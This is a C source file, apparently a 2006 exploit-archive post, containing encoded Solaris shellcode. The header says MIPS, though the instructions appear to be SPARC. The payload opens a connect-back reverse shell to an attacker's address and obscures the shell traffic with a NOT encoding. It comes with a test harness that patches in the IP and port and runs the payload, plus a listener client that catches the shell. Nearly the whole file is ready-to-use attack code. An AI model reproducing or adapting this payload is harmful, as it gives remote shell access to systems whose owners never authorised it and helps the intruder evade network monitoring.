/*

 black-RXenc-con-back-SOLARIS.c (MIPS)

 This is a relitivly small (600 byte) shellcode that encodes all network trafic between the
 exploited process and the attacker. All clear-text shell i/o is encoded using a simple NOT
 algo before being transmitted on the wire.

 7.21.6  Russell Sanford  (xort@blacksecurity.org)

*/



#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// opcode encodings for performing sethi/or against/into register %o1 w/ nulled data

#define SETHI_O1 0x13000000
#define OR_O1	 0x92126000

char rx_enc_con_back[] =
"\x13\x04\xbd\xd0\x93\x32\x60\x0c\xd2\x23\xbf\xd4\x13\x1b\x5c\x0b\x92\x12\x63\x50\xd2\x23\xbf\xd8\xc0\x23\xbf\xdc\x20\xbf\xff\xff"
"\x20\xbf\xff\xff\x7f\xff\xff\xff\x9e\x03\xe0\x90\x20\xbf\xff\xfb\x81\xc3\xe0\x04\x96\x1a\xc0\x0b\x81\xc3\xff\x1c\x92\x10\x20\x02"
"\x94\x1a\x80\x0a\x96\x1a\xc0\x0b\x98\x10\x20\x01\x82\x10\x20\xe6\x91\xd0\x20\x08\x80\x1a\xc0\x0b\x81\xc3\xe0\x08\x80\x1a\xc0\x0b"
"\x82\x10\x20\x02\x91\xd0\x20\x08\x96\x1a\xc0\x0b\x80\x92\xc0\x09\x12\xbf\xff\xf0\x96\x1a\xc0\x0b\x7f\xff\xff\xf1\x90\x10\x20\x01"
"\xd0\x23\xbf\xcc\xe0\x03\xbf\xcc\x90\x03\xbf\xd6\x82\x10\x20\x0a\x91\xd0\x20\x08\xd0\x03\xbf\xcc\x92\x03\xbf\xd4\x94\x10\x20\x08"
"\x96\x10\x20\x03\x98\x1a\xc0\x0b\x82\x10\x20\xe8\x91\xd0\x20\x08\xd0\x03\xbf\xcc\x92\x10\x20\x01\x94\x10\x20\x01\x82\x10\x20\xe9"
"\x91\xd0\x20\x08\xd0\x03\xbf\xcc\x92\x03\xbf\xd4\x94\x10\x20\x28\xd4\x23\xbf\xd0\x94\x03\xbf\xd0\x96\x10\x20\x01\x82\x10\x20\xea"
"\x91\xd0\x20\x08\xd0\x23\xbf\xcc\x94\x10\x20\x01\x92\x10\x20\x09\x82\x10\x20\x3e\x91\xd0\x20\x08\xd0\x03\xbf\xcc\x94\x22\xc0\x0b"
"\x91\xd0\x20\x08\xd0\x03\xbf\xcc\x94\x10\x20\x02\x91\xd0\x20\x08\x94\x1a\x80\x0a\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xcb\xdc"
"\xa2\x14\x63\x68\xd4\x23\xbf\xd0\xe2\x23\xbf\xcc\xe0\x23\xbf\xc8\x90\x23\xa0\x38\xd4\x23\xbf\xc4\xd0\x23\xbf\xc0\x92\x23\xa0\x40"
"\x82\x10\x20\x0b\x91\xd0\x20\x08\x90\x10\x20\x03\xd0\x23\xbf\xf8\x90\x03\xbf\xf8\x92\x1a\x40\x09\x82\x10\x20\xc7\x91\xd0\x20\x08"
"\x7f\xff\xff\xb7\x90\x10\x20\x01\x80\x18\x40\x02\xd0\x23\xbf\x80\x92\x03\xbf\xd4\x94\x10\x20\x08\x82\x10\x20\xeb\x91\xd0\x20\x08"
"\x7f\xff\xff\xaf\x90\x10\x20\x02\xd0\x23\xbf\xf8\x13\x0a\xb6\x48\x93\x32\x60\x0c\xd2\x23\xbf\xec\x13\x24\x28\x9e\x92\x12\x60\xd7"
"\xd2\x23\xbf\xf0\xc0\x23\xbf\xf4\x92\x03\xbf\xec\x94\x10\x20\x10\x82\x10\x20\xeb\x91\xd0\x20\x08\xe4\x03\xbf\xf8\xe2\x03\xbf\x80"
"\xe2\x23\xbf\xf8\xe4\x23\xbf\x80\x94\x10\x20\x01\x91\x2a\xa0\x10\xd0\x23\xbf\xfc\x90\x03\xbf\xf8\x92\x10\x20\x01\x84\x3a\xc0\x0b"
"\x82\x10\x20\x57\x91\xd0\x20\x08\x92\x18\x40\x01\x80\xa2\x40\x08\x02\xbf\xff\xf2\xd0\x03\xbf\xf8\x92\x03\xbf\x88\x94\x10\x20\x64"
"\x82\x10\x20\x03\x91\xd0\x20\x08\x92\x18\x40\x01\x80\xa2\x40\x08\x02\xbf\xff\xea\x92\x10\x3f\x9c\x9e\x03\xbf\xec\xd6\x03\xc0\x09"
"\x82\x22\xc0\x0b\x96\x3a\xc0\x01\xd6\x23\xc0\x09\x80\xa2\x40\x01\x12\xbf\xff\xfb\x92\x02\x60\x04\x94\x0a\x3f\xff\xd0\x03\xbf\x80"
"\x92\x03\xbf\x88\x82\x10\x20\x04\x91\xd0\x20\x08\x10\xbf\xff\xdb\x80\x18\x40\x02";


void patchcode(long ip, unsigned short port) {


	// fix sethi instruction to set up ip.
	*(long *)&rx_enc_con_back[408] = SETHI_O1 + ((ip)>>10 & 0x3fffff);

	// FIX or instruction to set up ip.
	*(long *)&rx_enc_con_back[412] = OR_O1 + (ip & 0x2ff);

	// fix sethi instruction to set up port/family.
	*(long *)&rx_enc_con_back[396] = SETHI_O1 + (((AF_INET<<16) + port)<<2);

}

void (*fakefunc)();

void main() {

	patchcode(inet_addr("10.0.0.3"), 44434);
	char *buffer = (char *) malloc(1024);
	strcpy(buffer, rx_enc_con_back);
	fakefunc = buffer;
	fakefunc();
}


/*
// quickclient.c - client for remote connect back solaris shellcode //
//                 w/ realtime encoded communications.              //
// xort@blacksecurity.org - 7.17.6                                  //

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#define PORT 44434

// simple routine to do NOT opperation on all data passed/revieved.

void notbuffer(char *string) {

	int i;

	for (i=0; i<100; i+=4)
		*(int *)(string+i) = ~ *(int *)(string+i);
}


void main() {


	struct sockaddr_in mine;
	int sockfd;
	char buffer[100];
	int len, sent, l;
	fd_set rfds, wfds;

	mine.sin_family = AF_INET;
	mine.sin_port = htons(PORT);
	mine.sin_addr.s_addr = 0;
	bzero(mine.sin_zero, 8);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	len = sizeof(mine);
	bind(sockfd, (struct sockaddr *)&mine, sizeof(mine));
	listen(sockfd, 1);
	sockfd = accept(sockfd, 0, &len);

         while (1) {
                FD_SET (0, &rfds);
                FD_SET (sockfd, &rfds);
                FD_SET (sockfd, &wfds);

                select (sockfd + 1, &rfds, NULL, NULL, NULL);

                if (FD_ISSET (0, &rfds)) {
                        l = read (0, buffer, sizeof (buffer));
			notbuffer(buffer);
                        if (l <= 0) {
                                exit (EXIT_FAILURE);
                        }
                        sent=0;
                        while (!sent) {
                                select (sockfd+1, NULL, &wfds, NULL, NULL);
                                if (FD_ISSET(sockfd, &wfds)) {
                                        write(sockfd, buffer, l);
                                        sent=1;
                                }
                        }
                }

                if (FD_ISSET (sockfd, &rfds)) {
                        l = read (sockfd, buffer, sizeof (buffer));
			notbuffer(buffer);
                        if (l == 0) {
                                fprintf(stdout,"\n [x] Connection Closed By Remote Host.\n");
                                exit (EXIT_FAILURE);
                        } else if (l < 0) {
                                exit (EXIT_FAILURE);
                        }
                        write (1, buffer, l);
                }
        }

}
*/

// milw0rm.com [2006-07-21]